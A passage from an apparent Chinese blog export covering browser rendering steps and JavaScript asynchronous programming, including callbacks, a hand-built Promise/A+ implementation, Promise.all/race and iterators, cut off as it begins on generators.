解析HTML文档，构件DOM树，下载资源，构造CSSOM树，执行js脚本，这些操作没有严格的先后顺序，以下分别解释 构建DOM树：通过词法分析进行标记化，再将标记变成Node节点，由Node节点组成DOM树construction：根据HTML标记关系将对象组成DOM树 解析过程中遇到图片、样式表、js文件，启动下载 构建CSSOM树： Tokenizing：字符流转换为标记流 Node：根据标记创建节点 CSSOM：节点创建CSSOM树 根据DOM树和CSSOM树构建渲染树: 回流：将可见DOM节点以及它对应的样式结合起来，计算它们在设备视口(viewport)内的确切位置和大小 重绘： 知道了哪些节点是可见的，以及可见节点的样式和具体的几何信息(位置、大小)，将渲染树的每个节点都转换为屏幕上的实际像素。 复合图层的合成、GPU绘制、外链资源的处理 JS引擎解析过程（JS的解释阶段，预处理阶段，执行阶段生成执行上下文，作用域链、回收机制等等 显示页面（HTML解析过程中会逐步显示页面）","categories":[{"name":"技术","slug":"技术","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/"},{"name":"前端","slug":"技术/前端","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/%E5%89%8D%E7%AB%AF/"},{"name":"HTML、浏览器综合","slug":"技术/前端/HTML、浏览器综合","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/%E5%89%8D%E7%AB%AF/HTML%E3%80%81%E6%B5%8F%E8%A7%88%E5%99%A8%E7%BB%BC%E5%90%88/"}],"tags":[]},{"title":"JS异步编程","slug":"JS异步编程","date":"2020-03-01T16:00:00.000Z","updated":"2024-05-25T04:21:29.805Z","comments":true,"path":"2020/03/02/JS异步编程/","link":"","permalink":"https://wtaufpziv.github.io/2020/03/02/JS%E5%BC%82%E6%AD%A5%E7%BC%96%E7%A8%8B/","excerpt":"序言在event loop中我们已经学习了，js是一门单线程语言，这意味着通常情况下JS运行的代码是同步且阻塞的，但是在实际应用中，尤其是在浏览器端，这种同步阻塞的编程无法实现特定的需求，当遇到一些耗时的计算，请求时就会造成后续线程的等待甚至卡死，给用户造成非常糟糕的体验。 基于这个问题，JS的异步编程解决方案应运而生。时至今日，前端开发人员依然能听到一句话：JS是单线程的，天生异步，适合IO密集型，不适合CPU密集型 接下来就来了解JS异步编程的实现方案","text":"序言在event loop中我们已经学习了，js是一门单线程语言，这意味着通常情况下JS运行的代码是同步且阻塞的，但是在实际应用中，尤其是在浏览器端，这种同步阻塞的编程无法实现特定的需求，当遇到一些耗时的计算，请求时就会造成后续线程的等待甚至卡死，给用户造成非常糟糕的体验。 基于这个问题，JS的异步编程解决方案应运而生。时至今日，前端开发人员依然能听到一句话：JS是单线程的，天生异步，适合IO密集型，不适合CPU密集型 接下来就来了解JS异步编程的实现方案 回调函数一提到回调函数所有人应该都不陌生，从第一天学习JS开始，我们就了解到JS的一个全局函数：setTimeout。 123setTimeout(function () &#123; console.log('Time out');&#125;, 1000); 在event loop这篇文章中，我们重新认识了setTimeout，它不再是一个简简单单的让代码延迟执行的定时器函数，同时也是JS实现异步编程的一个工具之一上述例子中，setTimeout内部的这个匿名函数，就叫做setTimeout的回调函数，意义就是在1秒之后，执行回调函数 对于回调函数，大多数人的第一反应应该还是ajax的回调，在请求完成之后执行一段代码。这样看来，回调函数似乎还蛮好用的，能够手动掌握一些代码的执行顺序，但是，考虑一下下面这个情况： 回调地狱这是微信小程序官方推荐（规定）的登录流程，可以看到，对于前端来说，需要先调用wx.login()接口获取code，然后使用code向自己的后台请求session_key，之后再调用其他业务接口时带上这个session_key，后台再返回数据。 对于上述流程，在使用axaj回调函数时，代码是这样的 12345678910111213141516171819202122232425262728wx.login(&#123; success(res) &#123; //第一层回调,调用wx.login接口 if (res.code) &#123; ajax.request(&#123; method: 'POST', url: 'user/register', data: &#123; code: res.code, &#125;, success: result =&gt; &#123; //第二层回调，获取session_key ajax.request(&#123; method: 'POST', url: 'user/getinfo', data: &#123; session_key: res.session_key, &#125;, success: result =&gt; &#123; //第三层回调，获取业务数据 ... &#125;, &#125;) &#125;, &#125;) &#125; &#125;&#125;) 可以看到，整段代码充满了回调嵌套，代码不仅在纵向扩展，横向也在扩展。我相信，对于任何人来说，调试起来都会很困难，我们不得不从一个函数跳到下一个，再跳到下一个，在整个代码中跳来跳去以查看流程，而最终的结果藏在整段代码的中间位置。真实的JavaScript程序代码可能要混乱的多，使得这种追踪难度会成倍增加。这就是我们常说的回调地狱（Callback Hell）。 为什么会出现这种现象？ 如果某个业务，依赖于上层业务的数据，上层业务又依赖于更上一层的数据，我们还采用回调的方式来处理异步的话，就会出现回调地狱。 大脑对于事情的计划方式是线性的、阻塞的、单线程的语义，但是回调表达异步流程的方式是非线性的、非顺序的，这使得正确推导这样的代码的难度很大，很容易产生Bug。 控制反转12345678// A$.ajax(&#123; ... success: function (...) &#123; // C &#125;&#125;);// B 对于上述代码，代码A和代码B是同步代码，由JavaScript的event loop机制监督执行，换句话说，JS扮演了一个绝对可靠的执行者，我们将代码交给它去执行。而代码C，却是由ajax库提供的回调API来执行，这个第三方的身份相对于JS来说就不是那么可靠。 ajax大家都知道是JS提供的异步请求方法与标准，这个问题在这个例子上貌似不会有太严重，但是，请不要被这个小概率迷惑而认为这种控制切换不是什么大问题。实际上，这是回调驱动设计最严重（也是最微妙）的问题。它以这样一个思路为中心：有时候ajax(…)，也就是你交付回调函数的第三方不是你编写的代码，也不在你的直接控制之下，它是某个第三方提供的工具。 这种情况称为控制反转，也就是把自己程序一部分的执行控制交给某个第三方，在你的代码和第三方工具直接有一份并没有明确表达的契约。 既然是无法控制的第三方在执行你的回调函数，那么就有可能存在以下问题，当然通常情况下是不会发生的： 调用回调过早 调用回调过晚 调用回调次数太多或者太少 未能把所需的参数成功传给你的回调函数 吞掉可能出现的错误或异常 …… 这种控制反转会导致信任链的完全断裂，如果你没有采取行动来解决这些控制反转导致的信任问题，那么你的代码已经有了隐藏的Bug，尽管我们大多数人都没有这样做。 Promise开门见山，Promise解决的是回调函数处理异步的第2个问题：控制反转在event loop中我们知道了，对于异步代码，event loop会将其放入event queue（任务队列）当中。而任务队列又分为宏队列和微队列，Promise就被分在了微队列当中。 由此可见，使用Promise之后代码的运行将由event loop完全接管，由Javascript运行机制来运行 Promise的含义所谓Promisem，简单来说就是一个容器，里面保存着某个未来才会结束的事件的结果，说白了就是一个耗时操作。从语法上来说，Promise是一个对象，他可以获取异步操作的消息，Promise提供统一的API，各种异步操作可以用同样的方法进行处理。 Promise对象有两个特点： 对象的状态不受外界影响。Promise有三种状态：Pending（进行中）， Fulfilled（已成功）， Rejected（已失败），只有异步操作的结果可以改变这个状态，其他手段无法改变 一旦状态改变之后就是稳定下来，不会发生二次改变。从pending变为Fulfilled或Rejected后，就一直保持这个结果，称为Resolve（已定型）。Promise可以将异步操作用同步的流程表达出来，避免了层层嵌套 用法Promise是一个构造函数 ，可以生成实例对象 123456789var promise = new Promise(function(resolve, reject)&#123; //....一些代码 if(//异步操作成功)&#123; resolve(value) &#125; else&#123; reject(err) &#125;&#125;) Promise构造函数接收一个函数作为参数，这个函数接收两个参数：resolve和reject。resolve的作用是将状态从pending变为Resolve，并将异步操作的结果带出去，异步操作成功时调用。reject的作用是将状态从pending变为Reject， 异步操作失败时调用，并将错误传递出去。 Promise实例生成后可以指定then方法作为回调，then方法接收两个函数作为参数， 第一个是promise状态变为resolved时调用，第二个是状态变为rejected时调用，其中，第二个参数是可选的 一个简单的例子123456789101112let propmise = new Promise(function(resolve, reject)&#123; console.log('a') resolve()&#125;)promise.then(function&#123; console.log('b')&#125;)console.log('c')//结果:acb 链式调用我们把上面那个多层回调嵌套的例子用Promise的方式重构 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263//获取codelet getKeyPromise = function () &#123; return new Promsie(function (resolve, reject) &#123; wx.login(&#123; success(res) &#123; //第一层回调,调用wx.login接口 if (res.code) &#123; resolve(res.code) &#125; &#125; &#125;) &#125;);&#125;;//获取session_ketlet getTokenPromise = function (key) &#123; return new Promsie(function (resolve, reject) &#123; $.ajax(&#123; type: 'get', url: 'http://localhost:3000/getToken', data: &#123; code: key &#125;, success: function (res) &#123; resolve(res.session_key); &#125;, error: function (err) &#123; reject(err); &#125; &#125;); &#125;);&#125;;//获取业务数据let getDataPromise = function (data) &#123; return new Promsie(function (resolve, reject) &#123; $.ajax(&#123; type: 'get', url: 'http://localhost:3000/getData', data: &#123; session_key: data, &#125;, success: function (res) &#123; resolve(res.userinfo); &#125;, error: function (err) &#123; reject(err); &#125; &#125;); &#125;);&#125;;getKeyPromise().then(function (key) &#123; return getTokenPromise(key);&#125;).then(function (data) &#123; return getDataPromise(data);&#125;).then(function (data) &#123; console.log('业务数据：', data);&#125;).catch(function (err) &#123; console.log(err);&#125;); 可以看到，Promise在一定程度上其实改善了回调函数的书写方式，最明显的一点就是去除了横向扩展，无论有再多的业务依赖，通过多个then(…)来获取数据，让代码只在纵向进行扩展；另外一点就是逻辑性更明显了，将异步业务提取成单个函数，整个流程可以看到是一步步向下执行的，依赖层级也很清晰，最后需要的数据是在整个代码的最后一步获得。 所以，Promise在一定程度上解决了回调函数的书写结构问题，但回调函数依然在主流程上存在，只不过都放到了then(…)里面，和我们大脑顺序线性的思维逻辑还是有出入的。 手动实现一个PromisePromise/A+ 规范：ES6主要用的是Promise/A+规范: Promise本身是一个状态机，每一个Promise实例只能有三个状态，pending、fulfilled、reject，状态之间的转化只能是pending-&gt;fulfilled、pending-&gt;reject，状态变化不可逆。 Promise有一个then方法，该方法可以被调用多次，并且返回一个Promise对象（返回新的Promise还是老的Promise对象，规范没有提）。 支持链式调用。 内部保存有一个value值，用来保存上次执行的结果值，如果报错，则保存的是异常信息 基本结构实例化Promise对象时传入一个函数作为执行器，有两个参数（resolve和reject）分别将结果变为成功态和失败态。我们可以写出基本结构 123456789101112131415function MyPromise(executor) &#123; this.state = 'pending'; //状态 this.value = undefined; //成功结果 this.reason = undefined; //失败原因 function resolve(value) &#123; &#125; function reject(reason) &#123; &#125;&#125;module.exports = Promise; 其中state属性保存了Promise对象的状态，规范中指明，一个Promise对象只有三种状态：等待态（pending）成功态（resolved）和失败态（rejected）。当一个Promise对象执行成功了要有一个结果，它使用value属性保存；也有可能由于某种原因失败了，这个失败原因放在reason属性中保存。 then方法定义在原型上每一个Promise实例都有一个then方法，它用来处理异步返回的结果，它是定义在原型上的方法，我们先写一个空方法做好准备： 12Promise.prototype.then = function (onFulfilled, onRejected) &#123;&#125;; 当实例化Promise时会立即执行传入的函数注意：当我们自己实例化一个Promise时，其执行器函数（executor）会立即执行，这是一定的：因此，当实例化Promise时，构造函数中就要马上调用传入的executor函数执行 1234567891011function Promise(executor) &#123; var _this = this; this.state = 'pending'; this.value = undefined; this.reason = undefined; executor(resolve, reject); //马上执行 function resolve(value) &#123;&#125; function reject(reason) &#123;&#125;&#125; 已经是成功态或是失败态不可再更新状态规范中规定，当Promise对象已经由pending状态改变为了成功态（resolved）或是失败态（rejected）就不能再次更改状态了。因此我们在更新状态时要判断，如果当前状态是pending（等待态）才可更新： 12345678910111213141516function resolve(value) &#123; //当状态为pending时再做更新 if (_this.state === 'pending') &#123; _this.value = value;//保存成功结果 _this.state = 'resolved'; &#125; &#125; function reject(reason) &#123; //当状态为pending时再做更新 if (_this.state === 'pending') &#123; _this.reason = reason;//保存失败原因 _this.state = 'rejected'; &#125; &#125; 以上可以看到，在resolve和reject函数中分别加入了判断，只有当前状态是pending才可进行操作，同时将成功的结果和失败的原因都保存到对应的属性上。之后将state属性置为更新后的状态。 then方法的基本实现当Promise的状态发生了改变，不论是成功或是失败都会调用then方法，所以，then方法的实现也很简单，根据state状态来调用不同的回调函数即可： 1234567891011121314Promise.prototype.then = function (onFulfilled, onRejected) &#123; if (this.state === 'resolved') &#123; //判断参数类型，如果是函数，则进行递归调用 if (typeof onFulfilled === 'function') &#123; onFulfilled(this.value); &#125; &#125; if (this.state === 'rejected') &#123; if (typeof onRejected === 'function') &#123; onRejected(this.reason); &#125; &#125;&#125;; 需要一点注意，规范中说明了，onFulfilled 和 onRejected 都是可选参数，也就是说可以传也可以不传。传入的回调函数也不是一定函数类型，那怎么办？规范中说忽略它就好了。因此需要判断一下回调函数的类型，如果明确是个函数再执行它。 让Promise支持异步代码写到这里似乎基本功能都实现了，可是还有一个很大的问题，目前此Promise还不支持异步代码，如果Promise中封装的是异步操作，then方法无能为力： 1234567let p = new MyPromise((resolve, reject) =&gt; &#123; setTimeout(() =&gt; &#123; resolve(1); &#125;，500);&#125;);p.then(data =&gt; console.log(data)); //没有任何结果 运行以上代码发现没有任何结果，本意是等500毫秒后执行then方法，哪里有问题呢？原因是setTimeout函数使得resolve是异步执行的，有延迟，当调用then方法的时候，此时此刻的状态还是等待态（pending），因此then方法即没有调用onFulfilled也没有调用onRejected。 这个问题如何解决？我们可以参照发布订阅模式，在执行then方法时如果还在等待态（pending），就把回调函数临时寄存到一个数组里，当状态发生改变时依次从数组中取出执行就好了，清楚这个思路我们实现它，首先在类上新增两个Array类型的数组，用于存放回调函数： 123456789function Promise(executor) &#123; var _this = this; this.state = 'pending'; this.value = undefined; this.reason = undefined; this.onFulfilledFunc = [];//保存成功回调 this.onRejectedFunc = [];//保存失败回调 //其它代码略...&#125; 这样当then方法执行时，若状态还在等待态（pending），将回调函数依次放入数组中： 123456789101112Promise.prototype.then = function (onFulfilled, onRejected) &#123; //等待态，此时异步代码还没有走完 if (this.state === 'pending') &#123; if (typeof onFulfilled === 'function') &#123; this.onFulfilledFunc.push(onFulfilled);//保存回调 &#125; if (typeof onRejected === 'function') &#123; this.onRejectedFunc.push(onRejected);//保存回调 &#125; &#125; //其它代码略...&#125;; 寄存好了回调，接下来就是当状态改变时执行就好了： 123456789101112131415161718 function resolve(value) &#123; if (_this.state === 'pending') &#123; _this.value = value; //依次执行成功回调 _this.onFulfilledFunc.forEach(fn =&gt; fn(value)); _this.state = 'resolved'; &#125;&#125;function reject(reason) &#123; if (_this.state === 'pending') &#123; _this.reason = reason; //依次执行失败回调 _this.onRejectedFunc.forEach(fn =&gt; fn(reason)); _this.state = 'rejected'; &#125;&#125; 至此，Promise已经支持了异步操作，setTimeout延迟后也可正确执行then方法返回结果。 链式调用Promise处理异步代码最强大的地方就是支持链式调用，这块也是最复杂的，我们先梳理一下规范中是怎么定义的： 每个then方法都返回一个新的Promise对象（原理的核心） 如果then方法中显示地返回了一个Promise对象就以此对象为准，返回它的结果 如果then方法中返回的是一个普通值（如Number、String等）就使用此值包装成一个新的Promise对象返回。 如果then方法中没有return语句，就视为返回一个用Undefined包装的Promise对象 若then方法中出现异常，则调用失败态方法（reject）跳转到下一个then的onRejected 如果then方法没有传入任何回调，则继续向下传递（值的传递特性）。规范中说的很抽像，我们可以把不好理解的点使用代码演示一下。 其中第3项，如果返回是个普通值就使用它包装成Promise，我们用代码来演示： 123456789let p =new Promise((resolve,reject)=&gt;&#123; resolve(1);&#125;);p.then(data=&gt;&#123; return 2; //返回一个普通值&#125;).then(data=&gt;&#123; console.log(data); //输出2&#125;); 可见，当then返回了一个普通的值时，下一个then的成功态回调中即可取到上一个then的返回结果，说明了上一个then正是使用2来包装成的Promise，这符合规范中说的。 第4项，如果then方法中没有return语句，就视为返回一个用Undefined包装的Promise对象 123456789let p = new Promise((resolve, reject) =&gt; &#123; resolve(1);&#125;);p.then(data =&gt; &#123; //没有return语句&#125;).then(data =&gt; &#123; console.log(data); //undefined&#125;); 可以看到，当没有返回任何值时不会报错，没有任何语句时实际上就是return undefined;即将undefined包装成Promise对象传给下一个then的成功态。 第6项，如果then方法没有传入任何回调，则继续向下传递，这是什么意思呢？这就是Promise中值的穿透，还是用代码演示一下： 12345678910let p = new Promise((resolve, reject) =&gt; &#123; resolve(1);&#125;);p.then(data =&gt; 2).then().then().then(data =&gt; &#123; console.log(data); //2&#125;); 以上代码，在第一个then方法之后连续调用了两个空的then方法 ，没有传入任何回调函数，也没有返回值，此时Promise会将值一值向下传递，直到你接收处理它，这就是所谓的值的穿透。 当然，then方法也可以手动返回一个Promise对象 现在可以明白链式调用的原理，不论是何种情况then方法都会返回一个Promise对象，这样才会有下个then方法。 搞清楚了这些点，我们就可以动手实现then方法的链式调用，一起来完善它： 1234567Promise.prototype.then = function (onFulfilled, onRejected) &#123; var promise2 = new Promise((resolve, reject) =&gt; &#123; //代码略... &#125; return promise2;&#125;; 首先，不论何种情况then都返回Promise对象，我们就实例化一个新promise2并返回。 接下来就处理根据上一个then方法的返回值来生成新Promise对象，由于这块逻辑较复杂且有很多处调用，我们抽离出一个方法来操作，这也是规范中说明的。 resolvePromise方法用来封装链式调用产生的结果，下面我们分别一个个情况的写出它的逻辑，首先规范中说明，如果promise2和 x 指向同一对象，就使用TypeError作为原因转为失败 当then的返回值与新生成的Promise对象为同一个（引用地址相同），则会抛出TypeError错误： 123let promise2 = p.then(data =&gt; &#123; return promise2;&#125;); 运行结果： TypeError: Chaining cycle detected for promise # 很显然，如果返回了自己的Promise对象，状态永远为等待态（pending），再也无法成为resolved或是rejected，程序会死掉，因此首先要处理它： 123456789101112/*** 解析then返回值与新Promise对象* @param &#123;Object&#125; promise2 新的Promise对象 * @param &#123;*&#125; x 上一个then的返回值* @param &#123;Function&#125; resolve promise2的resolve* @param &#123;Function&#125; reject promise2的reject*/function resolvePromise(promise2, x, resolve, reject) &#123; if (promise2 === x) &#123; reject(new TypeError('Promise发生了循环引用')); &#125;&#125; 接下来就是分各种情况处理。当x就是一个Promise，那么就执行它，成功即成功，失败即失败。若x是一个对象或是函数，再进一步处理它，否则就是一个普通值： 123456789101112function resolvePromise(promise2, x, resolve, reject) &#123; if (promise2 === x) &#123; reject(new TypeError('Promise发生了循环引用')); &#125; if (x !== null &amp;&amp; (typeof x === 'object' || typeof x === 'function')) &#123; //可能是个对象或是函数 &#125; else &#123; //否则是个普通值 resolve(x); &#125;&#125; 此时规范中说明，若是个对象，则尝试将对象上的then方法取出来，此时如果报错，那就将promise2转为失败态。原文： 123456789101112131415function resolvePromise(promise2, x, resolve, reject) &#123; //代码略... if (x !== null &amp;&amp; (typeof x === 'object' || typeof x === 'function')) &#123; //可能是个对象或是函数 try &#123; let then = x.then;//取出then方法引用 &#125; catch (e) &#123; reject(e); &#125; &#125; else &#123; //否则是个普通值 resolve(x); &#125;&#125; 多说几句，为什么取对象上的属性有报错的可能？Promise有很多实现（bluebird，Q等），Promises/A+只是一个规范，大家都按此规范来实现Promise才有可能通用，因此所有出错的可能都要考虑到，假设另一个人实现的Promise对象使用Object.defineProperty()恶意的在取值时抛错，我们可以防止代码出现Bug。 此时，如果对象中有then，且then是函数类型，就可以认为是一个Promise对象，之后，使用x作为this来调用then方法。 如果then是个函数，那么就在x的环境下调用它 1234567891011121314151617181920212223//其他代码略...if (x !== null &amp;&amp; (typeof x === 'object' || typeof x === 'function')) &#123; //可能是个对象或是函数 try &#123; let then = x.then; if (typeof then === 'function') &#123; //then是function，那么执行Promise then.call(x, (y) =&gt; &#123; resolve(y); &#125;, (r) =&gt; &#123; reject(r); &#125;); &#125; else &#123; resolve(x); &#125; &#125; catch (e) &#123; reject(e); &#125;&#125; else &#123; //否则是个普通值 resolve(x);&#125; 这样链式写法就基本完成了。但是还有一种极端的情况，如果Promise对象转为成功态或是失败时传入的还是一个Promise对象，此时应该继续执行，直到最后的Promise执行完。 12345678p.then(data =&gt; &#123; return new Promise((resolve,reject)=&gt;&#123; //resolve传入的还是Promise resolve(new Promise((resolve,reject)=&gt;&#123; resolve(2); &#125;)); &#125;);&#125;) 此时就要使用递归操作了。 很简单，把调用resolve改写成递归执行resolvePromise方法即可，这样直到解析Promise成一个普通值才会终止，即完成此规范： 1234567891011121314151617181920212223//其他代码略...if (x !== null &amp;&amp; (typeof x === 'object' || typeof x === 'function')) &#123; //可能是个对象或是函数 try &#123; let then = x.then; if (typeof then === 'function') &#123; let y = then.call(x, (y) =&gt; &#123; //递归调用，传入y若是Promise对象，继续循环 resolvePromise(promise2, y, resolve, reject); &#125;, (r) =&gt; &#123; reject(r); &#125;); &#125; else &#123; resolve(x); &#125; &#125; catch (e) &#123; reject(e); &#125;&#125; else &#123; //是个普通值，最终结束递归 resolve(x);&#125; 到此，链式调用的代码已全部完毕。在相应的地方调用resolvePromise方法即可。 最后的最后其实，写到此处Promise的真正源码已经写完了，但是距离100分还差一分，是什么呢？ 规范中说明，Promise的then方法是异步执行的。 ES6的原生Promise对象已经实现了这一点，但是我们自己的代码是同步执行，不相信可以试一下，那么如何将同步代码变成异步执行呢？可以使用setTimeout函数来模拟一下： 123setTimeout(()=&gt;&#123; //此入的代码会异步执行&#125;,0); 利用此技巧，将代码then执行处的所有地方使用setTimeout变为异步即可，举个栗子： 12345678setTimeout(() =&gt; &#123; try &#123; let x = onFulfilled(value); resolvePromise(promise2, x, resolve, reject); &#125; catch (e) &#123; reject(e); &#125;&#125;,0); 好了，现在已经是满分的Promise源码了 一份完整的源码:123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124function Promise(executor) &#123; let self = this this.status = 'pending' //当前状态 this.value = undefined //存储成功的值 this.reason = undefined //存储失败的原因 this.onResolvedCallbacks = []//存储成功的回调 this.onRejectedCallbacks = []//存储失败的回调 function resolve(value) &#123; if (self.status == 'pending') &#123; self.status = 'resolved' self.value = value self.onResolvedCallbacks.forEach(fn =&gt; fn()); &#125; &#125; function reject(error) &#123; if (self.status == 'pending') &#123; self.status = 'rejected' self.reason = error self.onRejectedCallbacks.forEach(fn =&gt; fn()) &#125; &#125; try &#123; executor(resolve, reject) &#125; catch (error) &#123; reject(error) &#125;&#125;//实现then方法Promise.prototype.then = function (infulfilled, inrejected) &#123; let self = this let promise2 infulfilled = typeof infulfilled === 'function' ? infulfilled : function (val) &#123; return val &#125; inrejected = typeof inrejected === 'function' ? inrejected : function (err) &#123; throw err &#125; if (this.status == 'resolved') &#123; promise2 = new Promise(function (resolve, reject) &#123; //x可能是一个promise，也可能是个普通值 setTimeout(function () &#123; try &#123; let x = infulfilled(self.value) resolvePromise(promise2, x, resolve, reject) &#125; catch (err) &#123; reject(err) &#125; &#125;); &#125;) &#125; if (this.status == 'rejected') &#123; promise2 = new Promise(function (resolve, reject) &#123; //x可能是一个promise，也可能是个普通值 setTimeout(function () &#123; try &#123; let x = inrejected(self.reason) resolvePromise(promise2, x, resolve, reject) &#125; catch (err) &#123; reject(err) &#125; &#125;); &#125;) &#125; if (this.status == 'pending') &#123; promise2 = new Promise(function (resolve, reject) &#123; self.onResolvedCallbacks.push(function () &#123; //x可能是一个promise，也可能是个普通值 setTimeout(function () &#123; try &#123; let x = infulfilled(self.value) resolvePromise(promise2, x, resolve, reject) &#125; catch (err) &#123; reject(err) &#125; &#125;); &#125;) self.onRejectedCallbacks.push(function () &#123; //x可能是一个promise，也可能是个普通值 setTimeout(function () &#123; try &#123; let x = inrejected(self.reason) resolvePromise(promise2, x, resolve, reject) &#125; catch (err) &#123; reject(err) &#125; &#125;); &#125;) &#125;) &#125; return promise2&#125;function resolvePromise(p2, x, resolve, reject) &#123; if (p2 === x &amp;&amp; x != undefined) &#123; reject(new TypeError('类型错误')) &#125; //如果是个对象，则可能是promise,看下对象中是否有then方法，如果有~那就是个promise if (x !== null &amp;&amp; (typeof x === 'object' || typeof x === 'function')) &#123; try &#123;//为了防止出现 &#123;then:11&#125;这种情况,需要判断then是不是一个函数 let then = x.then if (typeof then === 'function') &#123; //由于x是一个Promise对象，因此需要在x上执行上面执行的then方法 //使用y暂存上一次递归中 then.call(x, function (y) &#123; //y 可能还是一个promise,那就再去解析，直到返回一个普通值为止 //这里理解这个Y是怎么来的，很关键，后文中介绍 //递归执行resolvePromise resolvePromise(p2, y, resolve, reject) &#125;, function (err) &#123; reject(err) &#125;) &#125; else &#123;//如果then不是function 那可能是普通对象 resolve(x) &#125; &#125; catch (e) &#123; reject(e) &#125; &#125; else &#123;//说明是一个普通值 //实现值的穿透 resolve(x) &#125;&#125; 深入理解终极解决链式调用的原理（个人理解，偏硬核，可能并不正确）实现链式调用的核心实现代码，有一个地方很重要： 123456789101112let then = x.thenif (typeof then === 'function') &#123; //由于x是一个Promise对象，因此需要在x上执行上面执行的then方法 then.call(x, function (y) &#123; //y 可能还是一个promise,那就再去解析，直到返回一个普通值为止 //这里理解这个Y是怎么来的，很关键，后文中介绍 //递归执行resolvePromise resolvePromise(p2, y, resolve, reject) &#125;, function (err) &#123; reject(err) &#125;)&#125; 可以看到，如果x是一个Promise对象，那么就会手动调用这个x的then()方法，在then方法里递归调用 resolvePromise 关键是，我们虽然看到then里面递归调用了resolvePromise， 而且由y决定递归终点。那么疑问就来了：我这里调用的then方法到底干了什么，我传入的匿名函数里的y又是怎么来的，它是怎么就能够控制了整个递归终点的 我们回到then方法本身： 123456Promise.prototype.then = function(infulfilled, inrejected)&#123; //... let self = this let x = infulfilled(self.value) //...&#125; 123function (y)&#123; resolcePromise(p1, y, res, rej)&#125; 看出问题了吗？是的，我们在调用x的then方法时，传入的是一个匿名带参函数而then方法里面最终会使用self.value传参给infulfilled所以很显然，用于判断递归终点的y， 也就是resolvePromise的第二个参数，实际上来源于x里的value值！！！于是，这里调用then方法的目的，实际上就是为了获取x.value 于是我们追根溯源，来到resolcePromise函数的递归终点，看看是什么东西： 没错，两个resolve 我们继续顺藤摸瓜，来到Promise里的resolve函数：resolve改变的，就是value值看到这，一切都明朗了。简单来说就是，当x是一个普通值时， 直接使用resolve改变顶层Promise对象的value；否则，通过调用x的then方法获取x内部的resolve的参数，并将这个值作为一个新的x进行递归，直到x的value值是一个普通值为止 y = x.value = x里面resolve的参数值 直观点理解，直接上个例子吧： 123456789101112131415new Promise(function(resolve, reject)&#123; resolve(2)&#125;).then(function(data)&#123; return new Promise(function(resolve, reject)&#123; resolve(new Promise(function(resolve, reject)&#123; resolve(new Promise(function(resolve, reject)&#123; resolve(8) &#125;)) &#125;)) &#125;)&#125;).then(function(a)&#123; console.log(a)&#125;) 对于上面这个例子，我们一步一步分析 上面new了四个Promise，我们分别取名promise1、2、3、4 三个Promise被new出来之后，各自构造函数里的resolve的参数，就是各个Promise对象的value值，所以各个value是这样的promise1.value = 2promise2.value = promise3promise3.value = promise4promise4.value = 8 当promise1的then方法被调用时，递归工作便开始了 第一次，resolvePromise(p2, promise2, re,rj)。可见promise2是个Promise对象，则调用他的then方法，通过y参数获取到promise2.value的值为promise3，不是普通值，继续递归调用 第二次， resolvePromise(p2, promise3, rs, rj)。可见promise3是个Promise对象，则调用他的then方法，通过y参数获取到promise3.value的值为promise4，不是普通值，继续递归调用 第三次，resolvePromise(p2, promise4, re,rj)。可见promise4是个Promise对象，则调用他的then方法，通过y参数获取到promise4.value的值为8，不是普通值，继续递归调用 第四次，resolvePromise(p2, 8, re,rj)。传入的第二个参数变成了8，到达递归终点，由resolvePromise调用resolve(8)———注意，这里和promise4里的resolve(8)不是同一个语句，两者作用都不一样。设置promise1.value的值变为8 输出8 总结一下这个步骤： resolvePromise通过调用then方法，获取内部resolve的参数的值进行递归 promise1的then方法返回promise2 promise2的then方法返回promise3 promise3的then方法返回promise4 promise4的then方法返回8. Promise.all()这个方法用于将多个Promise实例包装成为一个新的Promise实例 1var p = Promise.all([p1, p2, p3]) p的状态由p1，p2，p3决定，分成两种情况： 只有p1，p2，p3的状态都变成Fulfilled，p的状态才会变成Fulfilled，此时p1，p2，p3返回的额值组成一个数组，传递给p的回调函数 只要p1， p2，p3有一个被Rejected，p的状态就变为Rejected，第一个Rejected的实例的返回值会传递给p的回调函数 Promise.race()1var p = Promise.race([p1, p2, p3]) 这个方法中，只要p1, p2, p3有一个率先改变了状态，p的状态就会跟着改变，那个率先改变的Promise实例的返回值就传递给p的回调函数 生成器Generator在1中，我们确定了用回调表达异步流程的两个关键问题： 回调地狱 控制反转 在2中，我们详细介绍了Promise是如何把回调的控制反转又反转过来，恢复了可信任性。 现在，我们把注意力转移到一种顺序、看似同步的异步流程控制表达风格，这就是ES6中的生成器（Gererator）。 可迭代协议可迭代协议运行JavaScript对象去定义或定制它们的迭代行为，例如（定义）在一个for…of结构中什么值可以被循环（得到）。以下内置类型都是内置的可迭代对象并且有默认的迭代行为： Array Map Set String TypedArray 函数的Arguments对象 NodeList对象 为了变成可迭代对象，一个对象必须实现@@iterator方法，意思是这个对象（或者它原型链prototype chain上的某个对象）必须有一个名字是Symbol.iterator的属性：当一个对象需要被迭代的时候（比如开始用于一个for…of循环中），它的@@iterator方法被调用并且无参数，然后返回一个用于在迭代中获得值的迭代器。 迭代器迭代器（Iterator）是一种接口，为各种不同的数据结构提供统一的访问机制。任何数据结构，只要部署了Iterator接口，皆可以完成遍历操作 过程如下： 创建一个指针对象，指向当前数据结构的起始位置，也就是说遍历器实质上是一个指针 第一次调用指针对象的next方法，将指针指向数据结构第一个成员 第二次调用指针对象的next方法，指针指向数据结构的第二个成员 不断调动，直到它指向数据结构的最后一个成员 这是一个使用迭代器的例子： 123456789101112131415161718var str = 'hello';// 可迭代协议使用for...of访问typeof str[Symbol.iterator]; // 'function'for (var s of str) &#123; console.log(s); // 分别打印 'h'、'e'、'l'、'l'、'o'&#125;// 迭代器协议next方法var iterator = str[Symbol.iterator]();iterator.next(); // &#123;value: \"h\", done: false&#125;iterator.next(); // &#123;value: \"e\", done: false&#125;iterator.next(); // &#123;value: \"l\", done: false&#125;iterator.next(); // &#123;value: \"l\", done: false&#125;iterator.next(); // &#123;value: \"o\", done: false&#125;iterator.next(); // &#123;value: undefined, done: true&#125; 用Generator实现异步简介Generator函数从语法上，可以理解为一个状态机，封装了多个内部状态 